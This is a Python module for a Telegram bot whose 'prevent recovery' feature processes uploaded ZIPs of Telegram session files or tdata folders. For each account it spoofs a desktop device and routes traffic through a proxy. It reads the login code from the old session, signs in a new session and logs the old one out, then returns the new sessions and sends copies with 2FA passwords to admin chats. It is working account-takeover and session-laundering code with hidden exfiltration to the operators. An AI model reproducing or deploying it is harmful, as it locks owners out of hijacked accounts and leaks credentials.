import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import json
import re
import random
import sqlite3
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from dotenv import load_dotenv
from opentele.tl import TelegramClient as OpenteleClient
from opentele.api import API
from opentele.td import TDesktop

load_dotenv()
logger = logging.getLogger(__name__)

PREVENT_RECOVERY_BACK = os.getenv("PREVENT_RECOVERY_BACK", "").replace('\\n', '\n')

FANGZHAOHUI_API_ID = 2040
FANGZHAOHUI_API_HASH = "b18441a1ff607e10a989891a5462e627"

ADMIN_ID = os.getenv("ADMIN_ID", "")
MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))
BACK_BUTTON_EMOJI_ID = "5877629862306385808"

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

user_recovery_states = {}

def log_time(msg):
    logger.info(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]}] {msg}")

def repair_session(session_path):
    if not os.path.exists(session_path):
        return False

    backup_path = session_path + ".bak"
    try:
        shutil.copy2(session_path, backup_path)
        logger.info(f"已备份 {session_path} 到 {backup_path}")

        conn = sqlite3.connect(session_path)
        c = conn.cursor()
        c.execute("PRAGMA table_info(sessions)")
        existing_columns = [row[1] for row in c.fetchall()]
        required_columns = ['dc_id', 'server_address', 'port', 'auth_key', 'takeout_id', 'tmp_auth_key']
        if existing_columns == required_columns:
            conn.close()
            return True

        c.execute("BEGIN TRANSACTION")
        c.execute("CREATE TABLE sessions_new (dc_id INTEGER, server_address TEXT, port INTEGER, auth_key BLOB, takeout_id INTEGER, tmp_auth_key BLOB)")
        select_cols = []
        for col in required_columns:
            if col in existing_columns:
                select_cols.append(col)
            else:
                select_cols.append("NULL")
        select_sql = f"SELECT {', '.join(select_cols)} FROM sessions"
        c.execute(select_sql)
        rows = c.fetchall()
        for row in rows:
            c.execute("INSERT INTO sessions_new VALUES (?,?,?,?,?,?)", row)
        c.execute("DROP TABLE sessions")
        c.execute("ALTER TABLE sessions_new RENAME TO sessions")
        conn.commit()
        conn.close()
        logger.info(f"成功重建 {session_path} 的表结构，共迁移 {len(rows)} 行数据")
        return True
    except Exception as e:
        logger.error(f"修复 {session_path} 失败: {e}")
        return False

def load_proxies():
    global _proxy_list, _proxy_list_last_load

    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        log_time("使用缓存的代理列表")
        return _proxy_list

    proxy_file = "proxy.txt"
    valid_proxies = []

    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue

                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue

    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

def create_back_button():
    return InlineKeyboardButton(
        "返回主菜单",
        callback_data="back_to_main"
    ).to_dict() | {"icon_custom_emoji_id": BACK_BUTTON_EMOJI_ID}

def safe_extract(zip_ref, target_dir):
    for member in zip_ref.infolist():
        member_path = os.path.normpath(member.filename)
        if member_path.startswith(('..', '/', '\\')):
            raise Exception(f"非法路径: {member.filename}")
        zip_ref.extract(member, target_dir)

def generate_non_linux_api():
    max_attempts = 100
    attempt = 0
    while attempt < max_attempts:
        api = API.TelegramDesktop.Generate()
        if 'linux' not in api.device_model.lower():
            return api
        attempt += 1
    api = API.TelegramDesktop.Generate()
    api.device_model = "Desktop"
    return api

def find_tdata_folders(root_dir):
    tdata_dirs = set()
    for root, dirs, files in os.walk(root_dir):
        if os.path.basename(root) == 'tdata':
            if any(f in files for f in ['key_datas', 'map']):
                tdata_dirs.add(root)
        elif 'tdata' in dirs:
            potential = os.path.join(root, 'tdata')
            if os.path.exists(potential):
                sub_files = os.listdir(potential)
                if any(f in sub_files for f in ['key_datas', 'map']):
                    tdata_dirs.add(potential)
    return list(tdata_dirs)

def read_2fa_from_folder(folder_path: str):
    for file in os.listdir(folder_path):
        if file.lower() in ['2fa.txt', '2fa', 'password.txt']:
            try:
                with open(os.path.join(folder_path, file), 'r', encoding='utf-8') as f:
                    return f.read().strip()
            except:
                pass
    return None

async def convert_tdata_to_session_with_proxy(tdata_dir, output_dir, twofa, proxy_dict):
    start_time = time.time()
    log_time(f"开始转换 tdata: {tdata_dir}")
    API_ID = int(os.getenv("TELEGRAM_APP_ID", "2040"))
    API_HASH = os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")

    try:
        tdesk = TDesktop(tdata_dir)
        if not tdesk.isLoaded():
            return False, None, None, None, "tdata 文件无法加载"

        from opentele.api import UseCurrentSession
        client = await tdesk.ToTelethon(
            session=os.path.join(output_dir, "temp.session"),
            flag=UseCurrentSession,
            proxy=proxy_dict
        )

        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, None, None, None, "会话未授权"

        me = await client.get_me()
        if not me:
            await client.disconnect()
            return False, None, None, None, "无法获取用户信息"

        phone = me.phone
        if not phone:
            await client.disconnect()
            return False, None, None, None, "无法获取手机号"

        temp_session = os.path.join(output_dir, "temp.session")
        final_session = os.path.join(output_dir, f"{phone}.session")
        if os.path.exists(temp_session):
            shutil.move(temp_session, final_session)

        random_api = generate_non_linux_api()
        try:
            if hasattr(me, 'date') and me.date:
                reg_time = datetime.fromtimestamp(me.date.timestamp()).strftime("%Y-%m-%d")
            else:
                reg_time = datetime.now().strftime("%Y-%m-%d")
        except Exception:
            reg_time = datetime.now().strftime("%Y-%m-%d")

        json_data = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "device_model": random_api.device_model,
            "system_version": random_api.system_version,
            "app_version": random_api.app_version,
            "system_lang_code": random_api.system_lang_code,
            "lang_pack": random_api.lang_pack,
            "lang_code": random_api.lang_code,
            "pid": random_api.pid,
            "user_id": me.id,
            "phone": phone,
            "twofa": twofa if twofa else "",
            "password": twofa if twofa else "",
            "app_id": API_ID,
            "app_hash": API_HASH,
            "session_file": phone,
            "device": random_api.device_model,
            "username": me.username or "",
            "sex": None,
            "avatar": "img/default.png",
            "package_id": "",
            "installer": "",
            "ipv6": False,
            "SDK": random_api.system_version,
            "sdk": random_api.system_version,
            "system_lang_pack": random_api.system_lang_code,
            "premium": getattr(me, 'premium', False),
            "reg_time": reg_time
        }

        json_path = os.path.join(output_dir, f"{phone}.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, ensure_ascii=False, indent=2)

        await client.disconnect()
        elapsed = time.time() - start_time
        log_time(f"tdata 转换成功: {tdata_dir} -> {phone}，耗时 {elapsed:.2f}秒")
        return True, phone, final_session, json_path, None

    except Exception as e:
        elapsed = time.time() - start_time
        log_time(f"tdata 转换失败 {tdata_dir}: {e}，耗时 {elapsed:.2f}秒")
        logger.error(f"转换 tdata 失败 {tdata_dir}: {e}")
        return False, None, None, None, str(e)

async def show_prevent_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()

    keyboard = [[create_back_button()]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text=PREVENT_RECOVERY_BACK,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    user_recovery_states[user_id] = {"state": "waiting_zip"}

async def handle_recovery_document(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str):
    document = update.message.document

    if not document.file_name.endswith('.zip'):
        await update.message.reply_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
        user_recovery_states.pop(user_id, None)
        return

    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5443127283898405358'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )

    zip_path = None
    extract_dir = None

    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/recovery_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)

        await status_msg.edit_text(
            "<tg-emoji emoji-id='5839200986022812209'>🔍</tg-emoji> 正在解压并提取账号...",
            parse_mode='HTML'
        )

        extract_dir = f"downloads/recovery_extract_{user_id}_{int(time.time())}"
        os.makedirs(extract_dir, exist_ok=True)

        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            safe_extract(zip_ref, extract_dir)

        total_size = 0
        for root, dirs, files in os.walk(extract_dir):
            for f in files:
                total_size += os.path.getsize(os.path.join(root, f))

        if total_size > MAX_EXTRACT_SIZE:
            raise Exception(f"解压后文件过大 ({total_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")

        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_path = os.path.join(root, file)
                    session_files.append(session_path)

        if not session_files:
            tdata_dirs = find_tdata_folders(extract_dir)
            if not tdata_dirs:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 未找到session或tdata文件夹",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup([[create_back_button()]])
                )
                user_recovery_states.pop(user_id, None)
                return

            await status_msg.edit_text(
                f"<tg-emoji emoji-id='5839200986022812209'>🔄</tg-emoji> 检测到 {len(tdata_dirs)} 个tdata，正在转换...",
                parse_mode='HTML'
            )

            convert_dir = os.path.join(extract_dir, "converted_sessions")
            os.makedirs(convert_dir, exist_ok=True)

            for idx, tdata_dir in enumerate(tdata_dirs, 1):
                parent_dir = os.path.dirname(tdata_dir)
                twofa = read_2fa_from_folder(parent_dir)
                proxy = get_random_proxy()
                proxy_dict = create_proxy_dict(proxy) if proxy else None

                account_out = os.path.join(convert_dir, f"acc_{idx}")
                os.makedirs(account_out, exist_ok=True)

                try:
                    success, phone, sess_path, json_path, err = await asyncio.wait_for(
                        convert_tdata_to_session_with_proxy(tdata_dir, account_out, twofa, proxy_dict),
                        timeout=60
                    )
                except asyncio.TimeoutError:
                    success = False
                    err = "转换超时（60秒）"
                    phone = None
                    sess_path = None
                    json_path = None

                if success and sess_path and json_path:
                    session_files.append(sess_path)
                else:
                    logger.error(f"转换失败 {tdata_dir}: {err}")

                await asyncio.sleep(0.2)

            if not session_files:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 所有tdata转换失败，无法继续",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup([[create_back_button()]])
                )
                user_recovery_states.pop(user_id, None)
                return

        user_recovery_states[user_id] = {
            "state": "waiting_2fa",
            "session_files": session_files,
            "extract_dir": extract_dir,
            "zip_path": zip_path
        }

        keyboard = [
            [InlineKeyboardButton("跳过2FA", callback_data="recovery_skip_2fa")],
            [create_back_button()]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            f"""<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 已提取 {len(session_files)} 个账号

<tg-emoji emoji-id="6005570495603282482">🔐</tg-emoji> 请发送2FA密码（如果没有2FA，请点击“跳过2FA”按钮）：""",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

        await status_msg.delete()

    except Exception as e:
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
        user_recovery_states.pop(user_id, None)
        try:
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
        except:
            pass

async def handle_recovery_skip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = str(query.from_user.id)
    await query.answer()

    state_info = user_recovery_states.get(user_id)
    if not state_info or state_info.get("state") != "waiting_2fa":
        await query.edit_message_text(
            "<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 会话已过期，请重新开始",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
        return

    await process_recovery_task(update, context, user_id, two_fa=None)

async def handle_recovery_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()

    state_info = user_recovery_states.get(user_id)
    if not state_info or state_info.get("state") != "waiting_2fa":
        return

    await process_recovery_task(update, context, user_id, two_fa=text if text else None)

async def process_recovery_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str, two_fa: str = None):
    state_info = user_recovery_states.pop(user_id, None)
    if not state_info:
        return

    session_files = state_info["session_files"]
    extract_dir = state_info["extract_dir"]
    zip_path = state_info["zip_path"]

    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>防止找回任务开始</b>

总账号数: {len(session_files)}
<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> 正在处理，请稍候...""",
        parse_mode='HTML'
    )

    result_temp = None
    task = None

    try:
        result_temp = tempfile.mkdtemp()

        task = asyncio.create_task(
            _process_recovery_internal(update, context, user_id, session_files, extract_dir, two_fa, status_msg, result_temp)
        )

        await asyncio.wait_for(task, timeout=MAX_TASK_TIME)

    except asyncio.TimeoutError:
        if task and not task.done():
            task.cancel()
            try:
                await task
            except:
                pass

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>⚠️</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)，但已完成的账号会继续发送",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )

    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5778527486270770928'>❌</tg-emoji> 任务执行失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[create_back_button()]])
        )
    finally:
        try:
            if extract_dir and os.path.exists(extract_dir):
                shutil.rmtree(extract_dir, ignore_errors=True)
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)
            if result_temp and os.path.exists(result_temp):
                shutil.rmtree(result_temp, ignore_errors=True)
        except Exception:
            pass

        user_recovery_states.pop(user_id, None)

async def _process_recovery_internal(update, context, user_id, session_files, extract_dir, two_fa, status_msg, result_temp):
    success_dir = os.path.join(result_temp, "success")
    failed_dir = os.path.join(result_temp, "failed")
    os.makedirs(success_dir)
    os.makedirs(failed_dir)

    success_count = 0
    failed_count = 0
    results = []

    for idx, session_path in enumerate(session_files, 1):
        try:
            await status_msg.edit_text(
                f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>防止找回任务进行中</b>

进度: {idx}/{len(session_files)}
成功: {success_count} | 失败: {failed_count}
<tg-emoji emoji-id="5775887550262546277">⏳</tg-emoji> 正在处理 {os.path.basename(session_path)}...""",
                parse_mode='HTML'
            )
        except:
            pass

        session_basename = os.path.basename(session_path)
        session_name = os.path.splitext(session_basename)[0]

        json_path = None
        base_dir = os.path.dirname(session_path)
        possible_json = os.path.join(base_dir, f"{session_name}.json")
        if os.path.exists(possible_json):
            json_path = possible_json
        else:
            for root, dirs, files in os.walk(extract_dir):
                if f"{session_name}.json" in files:
                    json_path = os.path.join(root, f"{session_name}.json")
                    break

        try:
            result = await asyncio.wait_for(
                process_single_account(session_path, json_path, two_fa, user_id, session_name),
                timeout=120
            )
        except asyncio.TimeoutError:
            result = {
                "session_name": session_name,
                "status": "failed",
                "message": "处理超时（超过120秒）",
                "new_session_path": None,
                "new_json_path": None
            }
            logger.error(f"账号 {session_name} 处理超时")

        if result["status"] == "success":
            target_dir = success_dir
            success_count += 1
            if result["new_session_path"] and os.path.exists(result["new_session_path"]):
                shutil.copy2(result["new_session_path"], os.path.join(target_dir, os.path.basename(result["new_session_path"])))
            if result["new_json_path"] and os.path.exists(result["new_json_path"]):
                shutil.copy2(result["new_json_path"], os.path.join(target_dir, os.path.basename(result["new_json_path"])))
        else:
            target_dir = failed_dir
            failed_count += 1
            if os.path.exists(session_path):
                shutil.copy2(session_path, os.path.join(target_dir, session_basename))
            if json_path and os.path.exists(json_path):
                shutil.copy2(json_path, os.path.join(target_dir, os.path.basename(json_path)))

        results.append(result)
        await asyncio.sleep(0.1)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    success_zip = None
    failed_zip = None

    if success_count > 0:
        success_zip = os.path.join(result_temp, "success.zip")
        with zipfile.ZipFile(success_zip, 'w') as zipf:
            for root, dirs, files in os.walk(success_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, success_dir)
                    zipf.write(file_path, arcname)

    if failed_count > 0:
        failed_zip = os.path.join(result_temp, "failed.zip")
        with zipfile.ZipFile(failed_zip, 'w') as zipf:
            for root, dirs, files in os.walk(failed_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, failed_dir)
                    zipf.write(file_path, arcname)

    result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>防止找回任务完成</b>

总账号: {len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 成功: {success_count}
<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: {failed_count}"""

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=result_text,
        parse_mode='HTML'
    )

    if success_zip:
        with open(success_zip, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=f"recovery_success_{timestamp}.zip",
                caption=f"<b>成功转移的账号 ({success_count}个)</b>",
                parse_mode='HTML'
            )

    if failed_zip:
        with open(failed_zip, 'rb') as f:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=f"recovery_failed_{timestamp}.zip",
                caption=f"<b>失败的账号 ({failed_count}个)</b>",
                parse_mode='HTML'
            )

    if ADMIN_ID:
        for admin in ADMIN_ID.split(','):
            admin = admin.strip()
            if not admin:
                continue
            try:
                await context.bot.send_message(
                    chat_id=admin,
                    text=f"""<tg-emoji emoji-id="5909201569898827582">📢</tg-emoji> <b>防止找回任务完成</b>

用户: <code>{user_id}</code>
总账号: {len(session_files)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>成功: {success_count} |<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失败: {failed_count}""",
                    parse_mode='HTML'
                )
                if success_zip:
                    with open(success_zip, 'rb') as f:
                        await context.bot.send_document(chat_id=admin, document=f)
                if failed_zip:
                    with open(failed_zip, 'rb') as f:
                        await context.bot.send_document(chat_id=admin, document=f)
            except Exception as e:
                pass

    try:
        await status_msg.delete()
    except:
        pass

async def generate_json_for_session(session_file, client, me, api_id, api_hash, official_api):
    json_path = session_file.replace('.session', '.json')
    phone = me.phone if me.phone else os.path.basename(session_file).replace('.session', '')
    reg_time = datetime.now().strftime("%Y-%m-%d")

    device_model = getattr(official_api, 'device_model', 'Desktop')
    system_version = getattr(official_api, 'system_version', '')
    app_version = getattr(official_api, 'app_version', '')
    system_lang_code = getattr(official_api, 'system_lang_code', 'en')
    lang_pack = getattr(official_api, 'lang_pack', '')
    lang_code = getattr(official_api, 'lang_code', 'en')
    pid = getattr(official_api, 'pid', random.randint(100000, 999999))

    json_data = {
        "api_id": api_id,
        "api_hash": api_hash,
        "device_model": device_model,
        "system_version": system_version,
        "app_version": app_version,
        "system_lang_code": system_lang_code,
        "lang_pack": lang_pack,
        "lang_code": lang_code,
        "pid": pid,
        "user_id": me.id,
        "phone": phone,
        "twofa": "",
        "password": "",
        "app_id": api_id,
        "app_hash": api_hash,
        "session_file": os.path.basename(session_file).replace('.session', ''),
        "device": device_model,
        "username": me.username or "",
        "sex": None,
        "avatar": "img/default.png",
        "package_id": "",
        "installer": "",
        "ipv6": False,
        "SDK": system_version,
        "sdk": system_version,
        "system_lang_pack": system_lang_code,
        "premium": getattr(me, 'premium', False),
        "reg_time": reg_time
    }

    try:
        os.makedirs(os.path.dirname(json_path), exist_ok=True)
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        logger.info(f"已为 {session_file} 生成 JSON 配置: {json_path}")
        return json_path
    except Exception as e:
        logger.error(f"生成 JSON 失败 {session_file}: {e}")
        return None

async def process_single_account(session_path, json_path, two_fa, user_id, session_name):
    result = {
        "session_name": session_name,
        "status": "failed",
        "message": "",
        "new_session_path": None,
        "new_json_path": None
    }

    temp_dir = tempfile.mkdtemp()
    new_session_path = os.path.join(temp_dir, f"{session_name}_new.session")

    client_old = None
    client_new = None

    try:
        orig_json_data = {}
        if json_path and os.path.exists(json_path):
            try:
                with open(json_path, 'r', encoding='utf-8') as f:
                    orig_json_data = json.load(f)
            except Exception:
                pass

        api_id_val = FANGZHAOHUI_API_ID
        api_hash_val = FANGZHAOHUI_API_HASH
        if orig_json_data:
            if 'app_id' in orig_json_data and orig_json_data['app_id']:
                try:
                    api_id_val = int(orig_json_data['app_id'])
                except (ValueError, TypeError):
                    pass
            if 'app_hash' in orig_json_data and orig_json_data['app_hash']:
                api_hash_val = str(orig_json_data['app_hash'])

        device_model = orig_json_data.get('device_model') or None
        app_version = orig_json_data.get('app_version') or None
        system_lang_code = orig_json_data.get('system_lang_code') or None
        system_version = orig_json_data.get('system_version') or orig_json_data.get('sdk') or None
        lang_pack = orig_json_data.get('lang_pack') or None

        session_copy = os.path.join(temp_dir, f"{session_name}_copy.session")
        shutil.copy2(session_path, session_copy)

        proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(proxy) if proxy else None

        official_api_old = None
        client_old = None

        retry_count = 0
        while retry_count < 2:
            try:
                official_api_old = API.TelegramDesktop.Generate()
                if device_model is None:
                    max_attempts = 100
                    attempt = 0
                    while 'linux' in official_api_old.device_model.lower() and attempt < max_attempts:
                        official_api_old = API.TelegramDesktop.Generate()
                        attempt += 1
                    if 'linux' in official_api_old.device_model.lower():
                        official_api_old.device_model = "Desktop"
                else:
                    official_api_old.device_model = device_model

                official_api_old.api_id = api_id_val
                official_api_old.api_hash = api_hash_val
                if app_version:
                    official_api_old.app_version = app_version
                if system_lang_code:
                    official_api_old.system_lang_code = system_lang_code
                if system_version:
                    official_api_old.system_version = system_version
                if lang_pack:
                    official_api_old.lang_pack = lang_pack
                    official_api_old.lang_code = lang_pack

                client_old = OpenteleClient(
                    session=str(session_copy),
                    api=official_api_old,
                    proxy=proxy_dict,
                    receive_updates=False,
                    timeout=10,
                    connection_retries=1
                )
                break
            except ValueError as e:
                err_msg = str(e)
                if ("not enough values to unpack (expected 6, got 5)" in err_msg or
                    "too many values to unpack (expected 6)" in err_msg) and retry_count == 0:
                    logger.warning(f"检测到 session 文件格式问题: {session_copy}，尝试自动修复")
                    if repair_session(session_copy):
                        logger.info(f"修复完成，重试创建客户端")
                        retry_count += 1
                        continue
                    else:
                        logger.error(f"自动修复失败，无法使用该 session: {session_copy}")
                        result["message"] = "Session文件损坏且修复失败"
                        return result
                else:
                    result["message"] = f"创建客户端失败: {err_msg[:30]}"
                    return result
            except Exception as ex:
                result["message"] = f"创建客户端异常: {str(ex)[:30]}"
                return result

        connect_start = time.time()
        await asyncio.wait_for(client_old.connect(), timeout=15)
        log_time(f"连接耗时: {time.time() - connect_start:.2f}秒")

        auth_start = time.time()
        if not await asyncio.wait_for(client_old.is_user_authorized(), timeout=10):
            result["message"] = "原session无效"
            return result
        log_time(f"授权检查耗时: {time.time() - auth_start:.2f}秒")

        me_start = time.time()
        me = await asyncio.wait_for(client_old.get_me(), timeout=10)
        if not me:
            result["message"] = "无法获取用户信息"
            return result
        log_time(f"获取用户信息耗时: {time.time() - me_start:.2f}秒")
        phone = me.phone

        if not json_path or not os.path.exists(json_path):
            generated_json = await generate_json_for_session(
                session_path, client_old, me, api_id_val, api_hash_val, official_api_old
            )
            if generated_json:
                json_path = generated_json

        proxy_new = get_random_proxy()
        proxy_dict_new = create_proxy_dict(proxy_new) if proxy_new else None

        official_api_new = API.TelegramDesktop.Generate()

        client_new = OpenteleClient(
            session=str(new_session_path),
            api=official_api_new,
            proxy=proxy_dict_new,
            receive_updates=False,
            timeout=10,
            connection_retries=1
        )
        await client_new.connect()

        await client_new.send_code_request(phone)
        await asyncio.sleep(8)

        messages = await client_old.get_messages(777000, limit=3)
        code = None
        for msg in messages:
            if msg.text:
                match = re.search(r'(\d{5,6})', msg.text)
                if match:
                    code = match.group(1)
                    break

        if not code:
            result["message"] = "未收到验证码"
            return result

        try:
            await client_new.sign_in(phone, code)
        except SessionPasswordNeededError:
            if two_fa:
                await client_new.sign_in(password=two_fa)
            else:
                result["message"] = "需要2FA但未提供"
                return result

        await client_new.get_me()
        await client_old.log_out()

        new_json_data = {
            "api_id": official_api_new.api_id,
            "api_hash": official_api_new.api_hash,
            "device_model": official_api_new.device_model,
            "system_version": official_api_new.system_version,
            "app_version": official_api_new.app_version,
            "system_lang_code": official_api_new.system_lang_code,
            "lang_pack": official_api_new.lang_pack,
            "lang_code": official_api_new.lang_code,
            "pid": getattr(official_api_new, 'pid', random.randint(100000, 999999)),
            "user_id": me.id,
            "phone": phone,
            "twofa": two_fa if two_fa else "",
            "password": "",
            "app_id": official_api_new.api_id,
            "app_hash": official_api_new.api_hash,
            "session_file": f"{session_name}_new",
            "device": official_api_new.device_model,
            "username": me.username or "",
            "sex": None,
            "avatar": "img/default.png",
            "package_id": "",
            "installer": "",
            "ipv6": False,
            "SDK": official_api_new.system_version,
            "sdk": official_api_new.system_version,
            "system_lang_pack": official_api_new.system_lang_code,
            "premium": getattr(me, 'premium', False),
            "reg_time": datetime.now().strftime("%Y-%m-%d")
        }

        new_json_path = os.path.join(temp_dir, f"{session_name}_new.json")
        with open(new_json_path, 'w', encoding='utf-8') as f:
            json.dump(new_json_data, f, indent=2, ensure_ascii=False)

        result["status"] = "success"
        result["message"] = "成功转移"
        result["new_session_path"] = new_session_path
        result["new_json_path"] = new_json_path

    except asyncio.TimeoutError:
        result["message"] = "网络操作超时"
    except Exception as e:
        result["message"] = f"错误: {str(e)[:50]}"
    finally:
        if client_old:
            disconnect_start = time.time()
            await client_old.disconnect()
            log_time(f"断开连接耗时: {time.time() - disconnect_start:.2f}秒")
        if client_new:
            disconnect_start = time.time()
            await client_new.disconnect()
            log_time(f"断开连接耗时: {time.time() - disconnect_start:.2f}秒")

    return result
